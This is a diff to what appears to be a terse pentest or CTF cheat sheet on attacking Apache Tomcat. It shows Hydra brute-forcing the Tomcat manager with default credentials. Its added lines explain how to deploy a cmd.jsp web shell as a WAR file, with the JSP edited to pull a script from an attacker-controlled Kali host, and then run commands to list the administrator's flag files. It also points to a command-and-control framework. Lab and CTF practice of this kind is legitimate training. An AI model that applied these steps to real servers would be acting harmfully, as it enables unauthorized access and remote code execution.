@@ -37,9 +37,28 @@ USE HYDRA
 
 HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://X.X.X.X:8080/manager/html
 
-
 BASE64
 ======
 
 echo -n admin:admin | base64
 YWRtaW46YWRtaW4=
+
+SECOND_WAY
+==========
+
+https://github.com/SecurityRiskAdvisors/cmd.jsp
+
+change into cmd.jsp => <script src="http://YourServerKali/a.js"></script>
+
+zip cmd.war cmd.jsp
+
+Upload TOMCAT server => cmd.war
+
+http://X.X.X.X:8080/cmd/cmd.jsp
+
+cmd/c dir \users\administrator\desktop\flags
+
+github -> byt3bl33d3r/SILENTTRINITY
+====================================
+
+
